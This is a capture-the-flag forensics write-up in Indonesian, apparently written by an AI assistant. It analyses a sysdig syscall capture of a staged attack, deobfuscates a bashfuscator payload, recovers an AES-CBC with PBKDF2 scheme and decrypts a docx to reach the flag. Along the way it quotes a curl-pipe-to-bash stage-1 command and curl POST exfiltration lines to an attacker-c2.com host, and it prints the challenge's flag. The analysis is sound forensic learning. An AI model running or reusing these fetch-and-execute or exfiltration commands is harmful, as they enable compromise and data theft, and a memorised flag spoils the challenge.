---
Step-by-step: cara solve challenge ini

Step 0 — Identifikasi file

file capture.scap     # pcapng capture file - version 1.2

file bilang "pcapng", tapi ekstensi .scap + header block type 0x201/0x202 (bukan block pcapng standar) = ini sysdig capture, bukan network capture. Jadi jangan buka di Wireshark — pakai sysdig. Ini rekaman syscall, artinya kita bisa lihat semua yang terjadi di host: proses, argumen, isi read/write.

sudo apt install sysdig
sysdig -r capture.scap -c topprocs_cpu

Step 1 — Rekonstruksi timeline eksekusi

Langkah pertama di forensik syscall selalu: apa yang dieksekusi?

sysdig -r capture.scap "evt.type=execve and evt.dir=<" \
  -p "%evt.time %proc.pid %proc.ppid %proc.name %proc.exeline"

188 execve keluar, tapi ~166 di antaranya decoy loop yang sengaja dipasang buat bikin noise (ls/cat/grep/stat/cp berulang di /home/notaris/Documents, plus curl ke debian.org). Filter itu, sisa 22 event = rantai serangan asli:

bash -c 'curl .../kingzuy/secbox/.../auto_clean.deb | bash'   ← stage-1, curl|bash
  ├─ find /home -name Hasil_Sidang_2026.docx                   ← cari target
  ├─ curl .../inoginnsh/Apanii2/.../Apaniii                    ← ambil kunci
  ├─ sha256sum --tag .../keymaterial ; rm -rf ...              ← derivasi kunci
  ├─ python3 -                                                 ← enkripsi
  ├─ split -n 3 ; xxd -p                                       ← potong 3
  ├─ chmod +x /tmp/.send_data.sh                               ← siapkan exfil
  └─ rm -rf /tmp/.pecahan_data /tmp/.hasil_sidang_enc          ← anti-forensik

Perhatikan: semua file kerja dihapus. Jadi barang bukti cuma ada di dalam capture.

Step 2 — Ketemu tembok: snaplen 80 byte

Coba dump isi pipe curl | bash:

sysdig -r capture.scap "proc.pid=76835 and fd.type=pipe and evt.is_io_write=true" -p "%evt.buffer" \
  | awk '{print length($0)}' | sort -u      # → 80

Semua buffer terpotong di 80 byte. Capture dibuat dengan snaplen 80. Ini yang bikin chall-nya menarik: write 12 KB cuma nyisa 80 byte pertama.

Konsekuensinya:
- stage-1 (600 KB) → cuma 80 B per chunk ❌
- script python (572 B) → cuma 80 B ❌
- keymaterial (106 B) → cuma 80 B ❌
- ciphertext (38 KB) → ❌

Step 3 — Celahnya: /tmp/.send_data.sh

Ini aha moment-nya. Scan semua I/O di process tree penyerang:

sysdig -r capture.scap -A -c echo_fds "proc.pid in (76938,76950,...)" | grep send_data

Hasilnya: puluhan Write 64B to /tmp/.send_data.sh. 64 < 80 → utuh!

Kenapa 64? Karena stage-1 sengaja nulis pakai loop:

_emit() { local d=$1 i=0
    while [ $i -lt ${#d} ]; do printf %s "${d:i:64}" >&4; i=$((i+64)); done
}

Itu bug fatal si penyerang (dan hint dari author). Rekonstruksi byte-exact pakai hexdump:

sysdig -r capture.scap -x "fd.name=/tmp/.send_data.sh and evt.is_io_write=true"

Gabung semua baris 0x0000: ... → 77.727 byte utuh:

curl -X POST https://attacker-c2.com/upload -d "p1=<25856 hex>"
curl -X POST https://attacker-c2.com/upload -d "p2=<25856 hex>"
curl -X POST https://attacker-c2.com/upload -d "p3=<25856 hex>"

▎ ⚠️ Catatan filter: pakai evt.is_io_write=true saja. Kalau ditambah and evt.dir=< sysdig malah balikin 0 baris.

Step 4 — Rakit ciphertext

Gabung p1+p2+p3, hex-decode → 38.784 byte:

00000000: 5361 6c74 6564 5f5f 1ca7 d933 43a9 59ca   Salted__...3C.Y.

Header Salted__ = format openssl enc. Salt = 1ca7d93343a959ca. Sisanya 38.768 byte, kelipatan 16 → AES-CBC.

Tapi openssl enc -d tidak akan jalan, karena ternyata cuma header-nya yang mirip OpenSSL — derivasinya beda.

Step 5 — IV dari stdin python3

Script python dikirim lewat pipe (printf %s "$PY" | python3 -), 572 B → kepotong jadi 80 B. Tapi 80 byte pertama sudah cukup berharga:

sysdig -r capture.scap -x "proc.name=python3 and evt.is_io_read=true and fd.num=0"

iv="f00b147bcda5796de347a72c35844f72";src="/home/notaris/Documents/Hasil_Sidang_

IV didapat. Tapi kunci belum.

Step 6 — Keymaterial (dan oracle-nya)

sysdig -r capture.scap -x "fd.name contains keymaterial"

Write 106 B, tertangkap 80 B:

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKVAC4GCsUKnTIo+55VA24WZOxSV7j4Lg7O4kuEnqB5B

Kebetulan indah: "ssh-ed25519 " (12) + base64 (68) = tepat 80. Jadi blob key-nya utuh, yang hilang cuma 26 byte comment.

Sisanya diambil dari URL Apaniii yang tercatat di capture — isinya persis file kunci itu:

ssh-ed25519 AAAA...qB5B notaris@pn-surabaya.go.id

Cara verifikasi tanpa nebak: hitung sha256 dari 106 byte itu →

f00b147bcda5796de347a72c35844f72 dbb8f95186fa25fd26f1933fe8c64ad0
└──────── sama persis dengan IV ────────┘

Ini konfirmasi 100% bahwa keymaterial-nya benar, sekaligus ngasih tahu bahwa IV = sha256(keymaterial)[:32] (hex chars). Solver saya pakai ini sebagai oracle — bukan asumsi.

Step 7 — Deobfuscate stage-1 (buat tahu skema kunci pastinya)

IV ketemu, tapi kunci AES-nya apa? Tebakan naif (sha256 mentah, separuh belakang, dst.) semua gagal. Harus baca script aslinya. Payload 600 KB itu hasil bashfuscator, 3 lapis:

L0 — wrapper:
__=$(())&&${!__}<<<${!__}\<\<\<\$\'...\'
__=0 → ${!__} = indirect expansion $0 = bash. Jadi: bash <<< bash <<< $'...'.

L1 — aritmatika:
- $((~$(()))) = ~0 = -1
- grup berisi n unit → ~(-n) = n−1 → satu digit oktal
- $(()) = 0

Hasilnya string $'\137\144\75...' → decode oktal.

▎ Jebakan: substitusi $(())→0 harus sebelum decode oktal. Kalau kebalik, \06$(()) kebaca \06 (2 digit) bukan \060, dan semua output jadi sampah.

L2 — repeating-key XOR: hasil L1 berisi _d=<hex data>, _k=56f878d65c456f17, loop XOR, lalu eval.

600.570 B → 1.891 B script asli. Semua parsing, tanpa eksekusi.

Step 8 — Skema kripto aslinya

Dari script yang sudah bersih:

key = sha256(keymaterial).hexdigest().encode()          # 64 byte ASCII hex, BUKAN 32 byte digest
iv  = bytes.fromhex(key[:32])                           # separuh depan hexdigest
salt = os.urandom(8)
dk  = pbkdf2_hmac("sha256", key, salt, 10000, 48)       # ini yang bikin tebakan naif gagal
AES-256-CBC(dk[:32], iv) → b"Salted__" + salt + ct

Tiga jebakan sekaligus: (1) key itu ASCII hexdigest 64 byte, bukan digest biner 32 byte; (2) ada lapisan PBKDF2 10.000 iterasi; (3) header Salted__ cuma kamuflase — bukan EVP_BytesToKey OpenSSL.

Step 9 — Dekripsi & ambil flag

Padding valid (pad=12), plaintext 38.756 B diawali PK\x03\x04 = docx. Flag ada di word/document.xml dokumen Putusan Nomor 147/Pdt.G/2026/PN.Sby.

🚩 flag{s3ac1f9b0e7d4426a8f1c05e9b3a7d2f4}

---
Solvernya

Ada di /home/zuy/Downloads/speedrun/solver/:

┌────────────────────────────────────┬──────────────────────────────────────────────────────────────┐
│                File                │                             Isi                              │
├────────────────────────────────────┼──────────────────────────────────────────────────────────────┤
│ solve.py                           │ Solver end-to-end, capture → flag, print tiap tahap          │
├────────────────────────────────────┼──────────────────────────────────────────────────────────────┤
│ scap.py                            │ Helper sysdig: reassemble payload dari hexdump + cek snaplen │
├────────────────────────────────────┼──────────────────────────────────────────────────────────────┤
│ deob_stage1.py                     │ Deobfuscator bashfuscator 3 lapis (parsing murni)            │
├────────────────────────────────────┼──────────────────────────────────────────────────────────────┤
│ payloads/keymaterial.txt           │ SSH pubkey, biar solve bisa offline                          │
├────────────────────────────────────┼──────────────────────────────────────────────────────────────┤
│ payloads/auto_clean.deb.obfuscated │ Stage-1 mentah                                               │
├────────────────────────────────────┼──────────────────────────────────────────────────────────────┤
│ out/                               │ Hasil: docx, ciphertext, send_data.sh, stage-1 bersih        │
└────────────────────────────────────┴──────────────────────────────────────────────────────────────┘

cd /home/zuy/Downloads/speedrun/solver

python3 solve.py ../capture.scap                     # offline (pakai payloads/)
python3 solve.py ../capture.scap --fetch             # ambil keymaterial dari URL
python3 deob_stage1.py payloads/auto_clean.deb.obfuscated

Butuh sysdig + python3-cryptography. Keduanya sudah ada di mesin kamu — sudah saya test dan dua-duanya keluar flag yang sama.

Dua hal yang sengaja saya bangun ke dalam solver, bukan di-hardcode:
- solve.py:118 — IV di-parse dari stdin python3 di capture, bukan ditulis manual.
- solve.py:141 — keymaterial diverifikasi lewat oracle sha256(km)[:32] == IV dan dicek startswith() terhadap 80 byte yang ada di capture. Jadi kalau URL GitHub-nya berubah/mati, solver gagal dengan pesan jelas, bukan diam-diam ngasih hasil salah.

Satu bagian yang tetap perlu file eksternal: 26 byte comment di keymaterial (notaris@pn-surabaya.go.id) memang tidak ada di capture. Saya sudah simpan salinannya di payloads/ supaya reproducible offline. Kalau aturan CTF-nya wajib fully-offline, alternatifnya brute-force 26 byte itu dengan oracle IV di atas sebagai pengecek — tapi tanpa wordlist yang pas itu tidak praktis, jadi tidak saya implementasikan.
